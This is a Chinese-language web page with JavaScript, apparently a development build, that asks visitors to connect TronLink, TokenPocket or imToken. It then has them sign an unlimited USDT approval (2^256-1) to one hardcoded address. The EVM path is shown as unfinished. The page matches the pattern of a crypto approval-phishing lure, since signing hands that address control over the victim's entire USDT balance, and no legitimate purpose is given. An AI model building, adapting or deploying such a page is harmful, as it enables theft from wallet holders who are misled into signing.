<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>多链钱包授权 - USDT无限授权</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 24px;
            padding: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 28px;
            color: #333;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
        }
        
        .chain-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
        
        .chain-btn {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            background: white;
            border-radius: 12px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .chain-btn.active {
            border-color: #667eea;
            background: #f0f0ff;
            color: #667eea;
        }
        
        .wallet-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }
        
        .wallet-item {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            background: white;
        }
        
        .wallet-item.selected {
            border-color: #667eea;
            background: #f8f9ff;
        }
        
        .wallet-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 16px;
            font-size: 24px;
        }
        
        .wallet-info {
            flex: 1;
        }
        
        .wallet-name {
            font-weight: 600;
            color: #333;
            margin-bottom: 4px;
        }
        
        .wallet-chains {
            font-size: 12px;
            color: #999;
        }
        
        .approve-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .approve-btn:active {
            transform: scale(0.98);
        }
        
        .status {
            margin-top: 16px;
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
            text-align: center;
        }
        
        .status.loading {
            background: #fff3cd;
            color: #856404;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
        }
        
        .download-prompt {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            background: #333;
            color: white;
            padding: 16px;
            border-radius: 16px;
            text-align: center;
            animation: slideUp 0.3s ease;
            z-index: 1000;
        }
        
        .download-prompt a {
            color: #667eea;
            text-decoration: underline;
            margin-left: 8px;
        }
        
        @keyframes slideUp {
            from {
                transform: translateY(100%);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🔐 USDT 授权</h1>
            <div class="subtitle">选择链和钱包，授权 USDT 无限额度</div>
            
            <!-- 链选择 -->
            <div class="chain-selector" id="chainSelector">
                <button class="chain-btn" data-chain="1">Ethereum</button>
                <button class="chain-btn" data-chain="56">BNB Chain</button>
                <button class="chain-btn" data-chain="728126428">TRON</button>
            </div>
            
            <!-- 钱包列表 -->
            <div class="wallet-list" id="walletList">
                <!-- 动态渲染 -->
            </div>
            
            <!-- 授权信息 -->
            <div style="background: #f5f5f5; padding: 12px; border-radius: 12px; margin-bottom: 16px;">
                <div style="font-size: 12px; color: #666;">授权地址</div>
                <div style="font-size: 12px; color: #333; word-break: break-all;">TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA</div>
                <div style="font-size: 12px; color: #666; margin-top: 8px;">授权额度</div>
                <div style="font-size: 14px; color: #667eea; font-weight: 600;">无限额度 (2^256-1)</div>
            </div>
            
            <!-- 授权按钮 -->
            <button class="approve-btn" id="approveBtn">授权 USDT</button>
            
            <!-- 状态显示 -->
            <div class="status hidden" id="status"></div>
        </div>
    </div>
    
    <div id="downloadPrompt" class="download-prompt hidden"></div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    <script>
        // ==================== 配置 ====================
        // TRON USDT 合约地址
        const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        // 授权目标地址
        const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
        // 无限额度
        const UNLIMITED_AMOUNT = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        
        const wallets = {
            tokenpocket: {
                name: 'TokenPocket',
                icon: '🎫',
                scheme: 'tp://',
                download: {
                    ios: 'https://apps.apple.com/app/tokenpocket/id1389003581',
                    android: 'https://play.google.com/store/apps/details?id=com.vpaly.tokenpocket',
                    fallback: 'https://www.tokenpocket.pro/'
                },
                chains: ['evm', 'tron']
            },
            imtoken: {
                name: 'imToken',
                icon: '🔷',
                scheme: 'imtokenv2://',
                download: {
                    ios: 'https://apps.apple.com/app/imtoken/id1384798940',
                    android: 'https://play.google.com/store/apps/details?id=im.token.app',
                    fallback: 'https://token.im/'
                },
                chains: ['evm', 'tron']
            },
            tronlink: {
                name: 'TronLink',
                icon: '🌊',
                scheme: 'tronlink://',
                download: {
                    ios: 'https://apps.apple.com/app/tronlink/id1514876309',
                    android: 'https://play.google.com/store/apps/details?id=com.tronlinkapp.wallet',
                    fallback: 'https://www.tronlink.org/'
                },
                chains: ['tron']
            }
        };
        
        // EVM 钱包（TRON 链时不显示）
        const evmWallets = {
            metamask: {
                name: 'MetaMask',
                icon: '🦊',
                scheme: 'metamask://',
                download: {
                    ios: 'https://apps.apple.com/app/metamask/id1438144202',
                    android: 'https://play.google.com/store/apps/details?id=io.metamask',
                    fallback: 'https://metamask.io/download/'
                },
                chains: ['evm']
            },
            trust: {
                name: 'Trust Wallet',
                icon: '🔒',
                scheme: 'trust://',
                download: {
                    ios: 'https://apps.apple.com/app/trust-wallet/id1288339409',
                    android: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
                    fallback: 'https://trustwallet.com/download'
                },
                chains: ['evm']
            }
        };
        
        // 当前状态
        let currentChain = '728126428'; // 默认 TRON
        let selectedWallet = null;
        
        // ==================== 工具函数 ====================
        function showStatus(message, type = 'loading') {
            const statusEl = document.getElementById('status');
            statusEl.textContent = message;
            statusEl.className = `status ${type}`;
            statusEl.classList.remove('hidden');
        }
        
        function hideStatus() {
            document.getElementById('status').classList.add('hidden');
        }
        
        function showDownloadPrompt(wallet) {
            const prompt = document.getElementById('downloadPrompt');
            const downloadUrl = getDownloadUrl(wallet);
            prompt.innerHTML = `
                未检测到 ${wallet.name}<br>
                <a href="${downloadUrl}" target="_blank" style="color: #667eea;">点击下载钱包</a>
                <span style="margin-left: 12px; cursor: pointer;" onclick="closeDownloadPrompt()">✕</span>
            `;
            prompt.classList.remove('hidden');
            
            setTimeout(() => {
                closeDownloadPrompt();
            }, 5000);
        }
        
        function closeDownloadPrompt() {
            document.getElementById('downloadPrompt').classList.add('hidden');
        }
        
        function getDownloadUrl(wallet) {
            const ua = navigator.userAgent;
            if (/iPhone|iPad/i.test(ua)) {
                return wallet.download.ios;
            } else if (/Android/i.test(ua)) {
                return wallet.download.android;
            }
            return wallet.download.fallback;
        }
        
        function isMobile() {
            return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        }
        
        // ==================== TRON 授权 ====================
        async function approveTRON() {
            if (!selectedWallet) {
                showStatus('请先选择钱包', 'error');
                return;
            }
            
            const wallet = wallets[selectedWallet];
            
            showStatus(`正在连接 ${wallet.name}...`, 'loading');
            
            // 检查 TronLink 是否安装
            if (typeof window.tronLink === 'undefined' && typeof window.tronWeb === 'undefined') {
                hideStatus();
                showDownloadPrompt(wallet);
                return;
            }
            
            try {
                // 请求连接钱包
                let tronWeb;
                if (window.tronLink && window.tronLink.request) {
                    // TronLink 扩展
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                    tronWeb = window.tronLink.tronWeb;
                } else if (window.tronWeb) {
                    tronWeb = window.tronWeb;
                } else {
                    throw new Error('无法连接 TronLink');
                }
                
                const userAddress = tronWeb.defaultAddress.base58;
                showStatus(`已连接: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`, 'loading');
                
                // 构造 USDT 授权合约调用
                const contract = await tronWeb.contract().at(TRON_USDT_CONTRACT);
                
                // 调用 approve 方法，无限额度
                showStatus('请在弹出的钱包中确认授权...', 'loading');
                
                const result = await contract.approve(
                    SPENDER_ADDRESS,
                    UNLIMITED_AMOUNT
                ).send();
                
                console.log('授权结果:', result);
                
                if (result && result.result) {
                    showStatus(`✅ 授权成功！交易ID: ${result.txid.slice(0, 10)}...`, 'success');
                } else {
                    showStatus('授权失败，请重试', 'error');
                }
                
            } catch (error) {
                console.error('TRON 授权错误:', error);
                if (error.message.includes('denied') || error.message.includes('reject')) {
                    showStatus('用户取消了授权', 'error');
                } else {
                    showStatus('授权失败: ' + error.message, 'error');
                }
            }
        }
        
        // ==================== 唤起钱包（EVM 链暂时用跳转） ====================
        function openWallet() {
            const chainId = parseInt(currentChain);
            
            // TRON 链用专门的授权逻辑
            if (chainId === 728126428) {
                approveTRON();
                return;
            }
            
            // EVM 链暂时提示
            showStatus('EVM 链授权开发中，请先测试 TRON 链', 'error');
        }
        
        // ==================== UI 渲染 ====================
        function renderWalletList() {
            const chainId = parseInt(currentChain);
            const isTron = chainId === 728126428;
            
            let allWallets = {};
            if (isTron) {
                allWallets = wallets;
            } else {
                allWallets = evmWallets;
            }
            
            const container = document.getElementById('walletList');
            container.innerHTML = Object.entries(allWallets).map(([key, wallet]) => `
                <div class="wallet-item" data-wallet="${key}">
                    <div class="wallet-icon">${wallet.icon}</div>
                    <div class="wallet-info">
                        <div class="wallet-name">${wallet.name}</div>
                        <div class="wallet-chains">${wallet.chains.join(', ')}</div>
                    </div>
                </div>
            `).join('');
            
            // 绑定点击事件
            document.querySelectorAll('.wallet-item').forEach(item => {
                item.addEventListener('click', () => {
                    const walletKey = item.dataset.wallet;
                    selectedWallet = walletKey;
                    
                    document.querySelectorAll('.wallet-item').forEach(w => {
                        w.classList.remove('selected');
                    });
                    item.classList.add('selected');
                    
                    hideStatus();
                });
            });
        }
        
        // ==================== 初始化 ====================
        function init() {
            // 链选择器
            document.querySelectorAll('.chain-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    currentChain = btn.dataset.chain;
                    selectedWallet = null;
                    renderWalletList();
                    hideStatus();
                    
                    // 提示
                    const chainId = parseInt(currentChain);
                    if (chainId === 728126428) {
                        showStatus('TRON 链已就绪，选择钱包后点击授权', 'success');
                        setTimeout(() => hideStatus(), 2000);
                    } else {
                        showStatus('EVM 链开发中，请先测试 TRON 链', 'error');
                        setTimeout(() => hideStatus(), 2000);
                    }
                });
            });
            
            // 默认激活 TRON
            document.querySelector('.chain-btn[data-chain="728126428"]').classList.add('active');
            
            // 授权按钮
            document.getElementById('approveBtn').addEventListener('click', openWallet);
            
            // 渲染钱包列表
            renderWalletList();
            
            // 初始提示
            showStatus('TRON 链已就绪，选择钱包后点击授权', 'success');
            setTimeout(() => hideStatus(), 2000);
        }
        
        // 启动
        init();
    </script>
</body>
</html>
